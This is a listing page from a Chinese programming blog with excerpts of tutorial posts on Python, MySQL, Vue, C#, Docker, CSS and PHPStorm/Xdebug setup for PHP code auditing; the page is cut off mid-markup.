<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a6fae13afeead108bf0c2499cb3ebe6/" rel="bookmark">
			windows10安装python依赖，报错can‘t create or remove files in install directory
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		执行python setup.py安装依赖时，报如下错误：can’t create or remove files in install directory。
&gt;&gt; python setup.py install running install error: can't create or remove files in install directory The following error occurred while trying to add or remove files in the installation directory: [Errno 13] Permission denied: '/Library/Python/2.7/site-packages/test-easy-install-19811.write-test' The installation directory you specified (via --install-dir, --prefix, or the distutils default setting) was: /Library/Python/2.7/site-packages/ ...... 报错：无法在安装目录中创建或删除文件，想到是没有权限的问题，查问题都说使用管理员权限重新执行上面命令即可。但是使用管理员权限打开terminal，再次执行python setup.py install这个命令，还是报上面的错误。
下面通过卸载Windows自带的Python，然后重装解决这个问题。
在左下角搜索 设置 -&gt; 应用，搜索python，然后点击卸载。
卸载后，到https://www.python.org/downloads/windows/下载对应系统的可执行文件安装器，我的是64位，这里选择安装64位的Windows可执行文件安装器。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a6fae13afeead108bf0c2499cb3ebe6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ab7ca5498820253993221dc950efd54/" rel="bookmark">
			八股文--MySql
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		扫码关注公众号获取更多内容
索引
1. 索引是什么？
2. 索引有哪些优缺点？
3. MySQL有哪几种索引类型？
4. 说一说索引的底层实现？
5. 为什么索引结构默认使用B+Tree，而不是B-Tree，Hash，二叉树，红黑树？
6. 讲一讲聚簇索引与非聚簇索引？
7. 非聚簇索引一定会回表查询吗？
8. 联合索引是什么？为什么需要注意联合索引中的顺序？
9. 讲一讲MySQL的最左前缀原则?
10. 讲一讲前缀索引？
11. 了解索引下推吗？
12. 怎么查看MySQL语句有没有用到索引？
13. 为什么官方建议使用自增长主键作为索引？
14. 如何创建索引？
15. 创建索引时需要注意什么？
16. 建索引的原则有哪些？
17. 使用索引查询一定能提高查询的性能吗？
18. 什么情况下不走索引（索引失效）？
基础
1. 数据库的三范式是什么？
2. MySQL 支持哪些存储引擎?
3. 超键、候选键、主键、外键分别是什么？
4. SQL 约束有哪几种？
5. MySQL 中的 varchar 和 char 有什么区别？
6. MySQL中 in 和 exists 区别
7. drop、delete与truncate的区别
8. 什么是存储过程？有哪些优缺点？
9. MySQL 执行查询的过程
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ab7ca5498820253993221dc950efd54/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/410a28508880a23568e5ed3b1554c343/" rel="bookmark">
			PCL-OpenCV冲突的解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 测试LIO-SAM，编译期报错：error: field ‘param_k_’ has incomplete type ‘flann::SearchParams’查了github，把/usr/include/pcl-1.7/pcl/kdtree/kdtree_flann.h里面两个变量改成指针，顺利通过编译roslaunch lio_sam run秒崩，报malloc(): memory corruption开idee单独调试mapOptimation，定位到allocateMemory函数内的kdtreeCornerFromMap.reset(new pcl::KdTreeFLANN&lt;PointType&gt;()); kdtreeSurfFromMap.reset(new pcl::KdTreeFLANN&lt;PointType&gt;());分析：在这两个语句前还会初始化其他点云的指针，并没有报错，而初始化Kd树就报错；应该是前面改了param_k_那两个变量，导致后面会分配错误大小的内存，从而引起malloc(): memory corruption那么就不可以通过改变量类型的方式来解决PCL-OpenCV冲突问题了进一步调查，还有另一种解决冲突的方法：把OpenCV里的flann改成flann2，具体操作见博客注意：再OpenCV安装包修改后再重新安装，flann模块中的CmakeLists也要改；直接把Python模块删掉，不然不能通过编译(想用python-opencv的话还是乖乖装anaconda吧)重新编译Lio-sam，顺利运行 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6a9858446933ee6b9ab724f2e2af9ad/" rel="bookmark">
			python 导入gdal失败：DLL load failed 找不到指定的模块。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在conda环境中安装了pyqt和labelme等一些库之后，打算运行一个geotif转jpg的程序，但一开始运行就报错，显示imp.py中import importlib.machinery这句出了问题，最后一行
return _load(spec) ImportError: DLL load failed: 找不到指定的模块。虽然import不提示语法错误，但运行就报错，推测是gdal库导入出了问题， 由于之前安装的gdal是可用的，现在不能用了，捣鼓了半天，最后直接重装解决问题，与版本没关系。
conda进入该环境，
pip uninstall gdal
然后找到之前的gdal安装包，我的是GDAL-3.2.1-cp37-cp37m-win_amd64.whl，直接安装此安装包
pip install GDAL-3.2.1-cp37-cp37m-win_amd64.whl
安装成功后，再进入python进行import，问题解决
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3771eb5fc416e3cbadca9bb83936f3f7/" rel="bookmark">
			Python enumerate函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据下表和数据，一般用在 for 循环当中。
如下：
&gt;&gt;&gt; seasons = ['Spring', 'Summer', 'Fall', 'Winter'] &gt;&gt;&gt; list(enumerate(seasons)) [(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')] &gt;&gt;&gt; list(enumerate(seasons, start=1)) # 小标从 1 开始 [(1, 'Spring'), (2, 'Summer'), (3, 'Fall'), (4, 'Winter')] 这里需要注意的是：enumerate是先列出下标再列出对应的数据，在for循环中使用时一定要注意顺序是index，num这样，而不要错写为num，index。
如下：
nums=[2,7,11,15] for index, num in enumerate(nums): 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/233650c23cf2464a8752a8cf5c80a984/" rel="bookmark">
			Word和Excel中的常用办公操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 插入图片时表格形状不变形 2. 斜线表头制作 选中单元格，然后再开始菜单找到边框选择所有框线。在单元格中输入需要的文字。分别选择其中的文字一个设置为下标一个设置为上标在边框中找到斜线设置即可。最后按需调整字体大小
3. Word中的不同符号 Ctrl+Alt+C 输入的是版权符号Ctrl+Alt+T 输入的是商标符号Ctrl+Alt+R 输入的是注册符号 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47d1b805d09394a9ca54836829d6eb0a/" rel="bookmark">
			CocosCreator之ScrollView滑动列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我从来不以工具好坏来选择工具------麒麟子
常用api：
//ScrollView(滚动视图组件) let comp_scroll = this.node.getComponent(cc.ScrollView);//获取滚动视图组件 // comp_scroll.content = contentNode;//绑定滚动层 comp_scroll.scrollToBottom(0.5);//在0.5秒内滚动到视图底部 comp_scroll.scrollToTop(0.5);//在0.5秒内滚动到视图顶部 comp_scroll.scrollToLeft(0.5);//在0.5秒内滚动到视图左边 comp_scroll.scrollToRight(0.5);//在0.5秒内滚动到视图右边 comp_scroll.getScrollOffset();//获取滚动视图相对于左上角原点的当前滚动偏移 let maxScrollOffset = comp_scroll.getMaxScrollOffset();//获取滚动视图最大可以滚动的偏移量 comp_scroll.scrollToOffset(new cc.Vec2(maxScrollOffset.x / 2, maxScrollOffset.y / 2), 1);//在1秒内,滚动到视图中心 comp_scroll.scrollTo(new cc.Vec2(0, 1), 0.8);在0.8秒内,滚动到视图左上角 comp_scroll.stopAutoScroll();//立即停止滚动 滚动到指定位置，该操作需要在下一帧执行。或使用api立即刷新后执行
this.scheduleOnce(this._SetOffset, 0);//下一帧立即执行，此处需要在下一帧执行 _SetOffset() { a.scrollToOffset(cc.v2(this._arr_check_x, 0), time); }, 挂载组件：
理解：
理解：
content：滑动条目的容器
horizontal：开启横向滑动
vertical：开启纵向滑动
inertia：开启滚动惯性
brake：惯性回弹时间，官方默认的就是最好的
elastic：允许滚动内容超过边界，并回弹。
bounce_duration：回弹持续时间，0是瞬间回弹。
vertical_scroll_bar：滑动进度条
scroll_event：滚动事件回调，滚动时每帧触发
cancel_inner_events：滚动行为会取消子节点的触摸事件。【当条目存在按钮时请关掉他，否则按钮事件不容易触发】
踩坑指南：
大量节点同时加载到条目容器时会卡顿，请使用逐帧加载 或 动态加载的方式 添加条目节点。
动态加载的滑动列表：CocosCreator之动态加载滑动列表_神兽白泽-CSDN博客
整理不易，关注收藏不迷路。
目录：CocosCreator经典笔记_神兽白泽-CSDN博客
笔者qq、微信：1302109196
qq群：415468592
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60df56c84f737ee24243ed3c0a9eceb6/" rel="bookmark">
			CSS界面美化方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考的链接的网址：https://www.cnblogs.com/aheng123/p/5630761.html
整个这个实际上是遵循CSS 的对应的写法的，我接下来就将按照自己的要编的东西，为大家举例子
这个是CSS的手册，所有的东西都可以参考这里： https://css.doyoe.com/
下面是CSS 的东西-----
字体属性：(font)
大小 {font-size: x-large;}(特大) xx-small;(极小) 一般中文用不到，只要用数值就可以，单位：PX、PD
样式 {font-style: oblique;}(偏斜体) italic;(斜体) normal;(正常)
行高 {line-height: normal;}(正常) 单位：PX、PD、EM
粗细 {font-weight: bold;}(粗体) lighter;(细体) normal;(正常)
变体 {font-variant: small-caps;}(小型大写字母) normal;(正常)
大小写 {text-transform: capitalize;}(首字母大写) uppercase;(大写) lowercase;(小写) none;(无)
修饰 {text-decoration: underline;}(下划线) overline;(上划线) line-through;(删除线) blink;(闪烁)
常用字体： (font-family)
"Courier New", Courier, monospace, "Times New Roman", Times, serif, Arial, Helvetica, sans-serif, Verdana
背景属性： (background)
色彩 {background-color: #FFFFFF;}
图片 {background-image: url();}
重复 {background-repeat: no-repeat;}
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60df56c84f737ee24243ed3c0a9eceb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb923a71e346fdf623a62d531ab8a53c/" rel="bookmark">
			容器核心技术之Namespace
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Namespace概述Linux内核代码Namespace实现Linux提供的操作Namespace的APIclone() 函数setns() 函数unshare() 函数 和 unshare 命令 Namespace常用操作命令查看当前系统的namespace查看某进程的namespace进入某namespace运行命令 Namespace 练习 Namespace概述 Linux Namespace 是一种 Linux Kernel 提供的资源隔离方案：
• 系统可以为进程分配不同的 Namespace；
• 并保证不同的 Namespace 资源独立分配、进程彼此隔离，即 不同的 Namespace 下的进程互不干扰
最新的 Linux 5.6 内核中提供了 8 种类型的 Namespace：
Linux内核代码Namespace实现 进程数据结构
struct task_struct { ... /* namespaces */ struct nsproxy *nsproxy; ... } Namespace数据结构
struct nsproxy { atomic_t count; struct uts_namespace *uts_ns; struct ipc_namespace *ipc_ns; struct mnt_namespace *mnt_ns; struct pid_namespace *pid_ns_for_children; struct net *net_ns; }; 源码分析参考： Linux kernel Namespace源码分析
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb923a71e346fdf623a62d531ab8a53c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0549ad23e25d6f3904396b814484ccfc/" rel="bookmark">
			SpringBoot——Thymeleaf常见属性-使用th:each遍历数组、List、Map
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 th:each遍历数组 先创建一个user表
package com.liuhaiyang.springboot.entity; import lombok.Data; //@Data 添加这个注解将不需要在写构造方法set、get等 public class User { private Integer id; private String name; private String phone; private String address; //set()和get方法（） } 这里说一下要是想使用@Data注解，需要在pom文件添加lombok 插件
&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; 核心配置文件
#关闭Thymeleaf页面的缓存开关 spring.thymeleaf.cache=false #thymeleaf 模版前缀，默认值,可选项 spring.thymeleaf.prefix=classpath:/templates/ #thymeleaf 模版后缀，默认值,可选项 spring.thymeleaf.suffix=.html 写一个controller控制层类
@Controller public class UserController { @RequestMapping("/each/array") public String eachArray(Model model){ User[] users=new User[10]; for (int i=0;i&lt;10;i++){ User user=new User(); user.setId(i); user.setName("王五"+i); user.setPhone("8888888888"+i); user.setAddress("北京丰台"+i); users[i]=user; } model.addAttribute("users",users); return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0549ad23e25d6f3904396b814484ccfc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/135e06842289e938202bd9fa62aaf0eb/" rel="bookmark">
			小程序中轻松实现省市区的三级联动，选择地区如此简单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 介绍 省市区的三级联动，一般来说，还是挺麻烦的，但是好在，在小程序中，已经都做好了。
三级联动：其实没有什么特别的意义了，只是一种习惯的叫法，意思为通过省来确定市，通过市来确定区，由上一级决定下一级，所以是三级联动。
参数 在小程序中可以直接使用picker标签
mode 要设置为region，必须要填写
bindchange 绑定选择事件
绑定事件之中，通过e.detail.value可以获得省-市-区的文字值，通过e.detail.code可以获得省市区的编号值。这两项保存的值，均为数组，且都有三个元素。
简单使用 wxml中，使用如下代码
&lt;picker mode="region" bindchange="addr_change"&gt;点击切换地址&lt;/picker&gt; &lt;view wx:if="{{ addr[0] }}"&gt;您当前选择的地址为：{{ addr[0]}} - {{ addr[1] }} - {{ addr[2] }}&lt;/view&gt; &lt;view wx:if="{{ code[0] }}"&gt;您当前地址的编号为：{{ code[0]}} - {{ code[1] }} - {{ code[2] }}&lt;/view&gt; js中，使用如下代码
Page({ data: { addr: [], code: [] }, onLoad: function (options) { }, addr_change(e){ this.setData({addr: e.detail.value}); this.setData({code: e.detail.code}); } }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60bbce8974421c487aaced23805e0a73/" rel="bookmark">
			第二章 数据类型，运算符和表达式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
２．１引例
2.2 C语言的数据类型
​
2.3 C语言的常量
2.3.1 直接常量
2.3.2符号常量
2.4 C语言的变量
2.4.1 变量的定义与使用
2.4.2 整型变量
2.4.3 实型变量
2.4.4 字符型变量
2.5 运算符和表达式
2.5.1 赋值运算符和赋值表达式
2.5.2 算术运算符和算术表达式
2.5.3 逗号运算符和逗号表达式
2.5.4 求字节数运算符
2.6数据类型转换
2.6.1 自动类型转换
2.6.2 强制类型转换
２．１引例 #include &lt;stdio.h&gt;：stdio.h为系统文件，内部定义了printf()等方法，在程序最开始可以使用include将头文件引入进来
int main(void)：在一个C程序中有且仅有一个main()函数，他是程序运行的入口，main函数前面表示的是程序的返回值类型，后面表示的是传入参数，这里传入参数为void，也就是为空（可省略），返回参数是int类型
printf("Programming is fun");：此处调用了标准输出函数，会将引号中的内容输出到屏幕上，语句后的分号表示该语句的结束
return() 语句可以就结束程序，一般返回0表示程序运行正常，返回其他值则表示不同的错误情况 2.2 C语言的数据类型 2.3 C语言的常量 2.3.1 直接常量 直接常量又分为整型常量、实型常量,字符型常量和字符串常量。
1.整型常量
整型常量即整数,包括正整数、负整数和零。C语言中,整型常量可以用十进制、人进制
和十六进制表示。
十进制表示:由数字 0~9,正,负号组成,如 369,一663 等；
八进制表示:以 0(数字 0)为前缀,其后由数字 0～7 组成,如 0163,036等;人进制数一
般是无符号数。如 0192、—011 都是不合法的八进制常量。
十六进制表示:以Ox或 OX 为前缀,其后由数字0~9 和字母 A～F(字母大小写均可)组
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60bbce8974421c487aaced23805e0a73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/289d7c357a044c4a32e4d72aadba03cd/" rel="bookmark">
			C#连接MySql
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C#连接MySql 文章目录 C#连接MySql连接数据库连接数据库 操作数据库增删改 连接数据库 在MySql连接的流程上和微软自带的MSSql的流程是一样的，但是首先我们需要先为我们的项目安装Mysql.data插件，本插件可以通过NuGet来获得。通常MySql5.7对应6.7.9的版本即可，不需要最新版本。
在实际应用上，我们应当将连接数据库的逻辑做成一个单例类，这样可以更好的方便我们的管理。
连接数据库 声明一个连接的对象字符串 首先在使用之前我们需要引入命名空间：
using MySql.Data.MySqlClient; 声明一个连接的对象字符串，此字符串也可以手动书写，这里我们使用插件提供的StringBuilder方法来构建字符串：
MySqlConnectionStringBuilder mscsb = new MySqlConnectionStringBuilder(); //数据库地址，要求填入IP地址 mscsb.Server = "127.0.0.1"; //数据库用户名，这里我们使用管理员身份登录 mscsb.UserID = "root"; //数据库密码 mscsb.Password = "root"; //要使用的数据库 mscsb.Database = "sqltest_candelete"; 创建连接 使用MySqlConnection类来创建连接
MySqlConnection conn = new MySqlConnection(mscsb.ToString()); 打开连接 打开连接这一步是必须的，且每次对于数据库的操作结束后都需要关闭连接，打开连接的时候建议判断一下的当前连接是否是已经打开的状态。
//打开连接 conn.Open(); //关闭连接 conn.Close(); 创建想要使用的SQL语句 //SQL语句和在java中使用是一样的，我们通过字符串来使用 //这里我们创建了一个查询语句 string sql = $"select * from table_csharp"; 创建SQL命令 在C#中，Sql语句的执行需要通过命令进行
//这里的两个参数是传入我们之前写的Sql语句和之前创建的连接对象 MySqlCommand command = new MySqlCommand(sql, conn); 执行SQL命令 ExecuteReader——用于查询数据库。查询结果是返回MySqlDataReader对象，MySqlDataReader包含sql语句执行的结果，并提供一个方法从结果中阅读一行。ExecuteNonQuery——用于插入、更新和删除数据。ExecuteScalar——用于查询数据时，返回查询结果集中第一行第一列的值，即只返回一个值。 注意对于MySqlDataReader我们要保证使用结束之后要释放资源，所以建议使用using语句块。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/289d7c357a044c4a32e4d72aadba03cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4641f752e751389d9024522f4f1dc325/" rel="bookmark">
			VUE路由的工作原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.vue路由的两种模式 hash模式： 比如 'http://www.baidu.com/#/abc' hash 的值为 '#/abc' 它的特点在于：hash 虽然出现 URL 中，但不会被包含在 HTTP 请求中，因此改变 hash 不会重新加载页面 但是会触发 onhashchange 事件，所以我们可以监听，然后渲染自己要渲染的组件，达到路由的效果 history模式： 通过 HTML5 中新增的 pushState() replaceState() 方法 应用于浏览器的历史记录，在已有的 go()，back()，forward() 的基础之上，它们提供了对历史记录进行修改的功能 当它们执行修改时，虽然改变了当前的 URL，但你浏览器不会立即向后端发送请求 我们可以通过 onpopstate 事件，监听 history 的变化，然后渲染自己要渲染的组件，达到路由的效果 2、hash的特点 hash变化会触发网页跳转，即浏览器的前进和后退。 hash 可以改变 url ，但是不会触发页面重新加载（hash的改变是记录在 window.history 中），即不会刷新页面。也就是说，所有页面的跳转都是在客户端进行操作。因此，这并不算是一次 http 请求，所以这种模式不利于 SEO 优化。hash 只能修改 # 后面的部分，所以只能跳转到与当前 url 同文档的 url 。
hash 通过 window.onhashchange 的方式，来监听 hash 的改变，借此实现无刷新跳转的功能。
hash 永远不会提交到 server 端（可以理解为只在前端自生自灭）。
更新视图但不重新请求页面，是前端路由原理的核心之一，目前在浏览器环境中这一功能的实现主要有2种方式：
利用URL中的hash("#");利用History interface在HTML5中新增的方法; vue-router是Vue.js框架的路由插件，它是通过mode这一参数控制路由的实现模式的：
const router=new VueRouter({ mode:'history', routes:[.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4641f752e751389d9024522f4f1dc325/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5703d9528e22be586c56d3287ab73101/" rel="bookmark">
			Vue CLI 模式和环境变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模式是Vue CLI项目中的一个重要概念，默认情况下它有三种模式：
development 被 vue-cli-service serve 使用
test 由 vue-cli-service test:unit 使用
production 由 vue-cli-service build 和 vue-cli-service test:e2e 使用
通过传递–mode选项标志，可以覆盖用于命令的默认模式。例如，如果要在build命令中使用开发变量：
vue-cli-service --mode development 运行 vue-cli-service 时，将从所有相应的文件加载环境变量，如果它们不包含 NODE_ENV 变量，则会相应地进行设置。
例如，NODE_ENV 将在生产模式下设置为 “production”，在测试模式下设置为 “test”，否则默认为 “development”；然后 NODE_ENV 将确定应用程序运行的主要模式-开发、生产或测试-并因此创建什么样的webpack配置。
将 NODE_ENV 设置为 “test” 时，Vue CLI会创建一个webpack配置，用于单元测试并对其进行优化，它不处理单元测试不需要的图像和其他资产。
NODE_ENV=development 创建一个webpack配置，该配置启用HMR，不散列资产或创建供应商包，以便在运行dev服务器时能够快速重新构建。
运行 vue cli service build 时，无论要部署到什么环境，都应始终将节点环境设置为“生产”以获取可供部署的应用程序。
注意：如果 NODE_ENV 的环境中有默认值，则它在运行 vue-cli-service 命令时将删除或进行显示设置。
环境变量 环境变量我们可以从它的模式还有变量内容进行认识和了解：
我们可以通过在项目根目录中放置以下文件来指定环境变量：
.env // 在所有情况下加载 .env.local // 在所有情况下加载，被git忽略 .env.[mode] // 仅以指定模式加载 .env.[mode].local // 仅在指定模式下加载，被git忽略 一个环境文件仅包含环境变量的key = value对；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5703d9528e22be586c56d3287ab73101/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76b9230855028512ac94dd9c83e28322/" rel="bookmark">
			Dockerfile制作tomcat镜像，解决404问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Dockerfile制作tomcat镜像 编写Dockerfile文件构建镜像查看镜像运行镜像进入容器外网访问本地测试在文件中进行操作创建xml 配置文件创建jsp文件 查看网页修改`index.jsp`文件存放的的路径 查看日志 首先准备好JDK和tomcat的压缩包tar.gz文件 编写Dockerfile文件 官方命名Dockerfile，build会自动寻找这个文件，就不需要-f指定。
vim Dockerfile FROM centos MAINTAINER lieonchou&lt;email_address&gt; COPY readme.txt /usr/local/readme.txt #将所写的readme.txt文件复制到容器内部 ADD jdk-8u11-linux-x64.tar.gz /usr/local/ #添加文件，解压路径 ADD apache-tomcat-9.0.22.tar.gz /usr/local #添加文件，解压路径 ENV MYPATH /usr/local WORKDIR $MYPATH ENV JAVA_HOME /usr/local/jdk1.8.0_11 ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22 ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.22 ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib$CATALINA_HOME/bin EXPOSE 8080 CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.22/bin/logs/catalina.out 构建镜像 docker build -t diytomcat . #最后的点表示当前目录 查看镜像 docker images 运行镜像 docker run -d -p 9090:8080 --name lieontomcat -v /home/lieon/build/tomcat/test:/urs/local/apache-tomcat-9.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76b9230855028512ac94dd9c83e28322/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b169c03a0b6b0393d8b506412e75e38f/" rel="bookmark">
			C#异步编程基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C#异步编程基础 文章目录 C#异步编程基础什么是异步为什么要学习异步编程async/awaitasync/await特性的结构什么是异步方法异步方法控制流await表达式取消一个异步操作等待任务Task.Delay方法Task.Yield方法使用异步Lambda表达式 BackgroundWorker主要成员：属性方法事件 其他异步编程模式BeginInvoke和EndInvoke等待直到完成轮询回调 什么是异步 启动程序时，系统会在内存中创建一个新的进程，进程是构成运行程序的资源的集合。这些资源包括虚地址空间、文件句柄和程序运行所需要的其他许多东西。
在进程的内部，系统会创建一个称为线程的内核对象，他代表了真正执行的程序。一旦线程建立，系统会在Main方法的第一行语句初开始线程的执行。
关于线程，我们需要了解以下知识点：
默认情况下，一个进程只会包含一个线程，从程序的开始一直执行到结束，一般我们称其为UI线程或者主线程。线程可以派生其他线程，但是注意所有的线程资源都是程序向OS申请的。因此在任意时刻，一个进程都可能包含不同状态的多个线程，他们执行程序的不同部分。如果一个进程拥有多个线程，则他们会共享进程的资源。进程是程序执行流的最小单位，系统为处理器调度的单元是线程而不是进程。 为什么要学习异步编程 在很多种情况下，单线程模型都会在性能或用户体验上导致难以接受的行为。
async/await 先来看一个例子：
在下面的例子中我们使用异步方法对两个网站的字符串进行了下载。
using System; using System.Diagnostics; using System.Net; using System.Threading.Tasks; namespace MultiThreadTest_1 { internal class Program { public static void Main(string[] args) { MyDownloadString myDownloadString = new MyDownloadString(); myDownloadString.DoRun(); } } public class MyDownloadString { //使用Stopwatch记录时间 Stopwatch _stopwatch = new Stopwatch(); /// &lt;summary&gt; /// 执行主方法 /// &lt;/summary&gt; public void DoRun() { _stopwatch.Start(); //执行两个异步方法分别获得两个网站的字符串长度 Task&lt;int&gt; task = CountCharacterAsync(1, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b169c03a0b6b0393d8b506412e75e38f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29076d25bfab6c12fe5ed7fde17b6657/" rel="bookmark">
			第0篇：php代码审计之phpstorm环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、环境 1、phpstorm v2020.1.4 官网下载：https://www.jetbrains.com/phpstorm/download/other.html
2、phpstudy V8.1 官网下载：https://www.xp.cn/download.html
3、windows10
二、phpstorm配置debug环境 1、配置php执行文件 推荐下载php5.6版本（phpstudy中即可下载）
2、配置php.ini文件 记事本打开php.ini文件，复制如下代码到末端： [XDebug] zend_extension="B:\phpstudy_pro\Extensions\php\php5.6.9nts\ext\php_xdebug.dll" xdebug.profiler_output_dir="B:\phpstudy_pro\Extensions\php\tmp" xdebug.trace_output_dir="B:\phpstudy_pro\Extensions\php\tmp" ;是否开启自动跟踪 xdebug.auto_trace= 1 ;启用性能检测分析 xdebug.profiler_append = 0 xdebug.profiler_enable = 1 xdebug.profiler_enable_trigger = 0 ;是否开启远程调试 xdebug.remote_enable = 1 ;调试插件dbgp xdebug.remote_handler = "dbgp" ;允许调试的客户端IP(如果远程主机开放则填远程主机的ip） xdebug.remote_host = "127.0.0.1" ;允许调试的端口 xdebug.remote_port = 9027 xdebug.remote_mode = "req" ;是否开启远程调试自动启动 xdebug.remote_autostart=1 xdebug.idekey = PHPSTORM 注意目录位置处更改成自己的环境目录，重启下phpstudy。
3、phpstorm的settings配置 4、debug的运行网址配置 5、检测是否配置成功 三、自动化审计神器推荐 1、rips 由国外的安全研究者Johannes Dahse开发，目前开源的最新版本是0.55。程序小巧玲珑，仅有不到500kb，其中的PHP语法分析非常精准，可以实现跨文件变量和函数追踪，误报率较低。
官网：http://rips-scanner.sourceforge.net/ （全英文)
汉化版下载: GitHub - J0o1ey/rips-Chinese: 本人三年前汉化的PHP代码审计工具rips
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29076d25bfab6c12fe5ed7fde17b6657/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
